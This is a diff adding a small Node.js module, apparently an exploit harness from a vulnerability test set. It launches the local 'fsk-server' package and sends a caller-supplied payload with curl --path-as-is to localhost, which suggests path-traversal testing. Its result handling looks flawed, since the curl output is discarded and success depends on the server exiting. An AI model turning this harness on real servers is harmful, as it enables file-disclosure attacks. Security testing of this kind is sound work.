@@ -1,0 +1,20 @@
+const { exec } = require("child_process");
+
+async function exploitFunction(payload) {
+  const path = require("path");
+  let server = "node ./node_modules/fsk-server/index.js";
+  let exe = exec(server, (error, stdout) => {
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:3001${payload}"`;
+    exec(attack_string, (error, stdout) => {
+      return stdout;
+    });
+  });
+
+  return new Promise((resolve, reject) => {
+    exe.on("exit", (code) => {
+      resolve(code === 0 ? "Success" : "Failure");
+    });
+  });
+}
+
+module.exports = { exploitFunction };
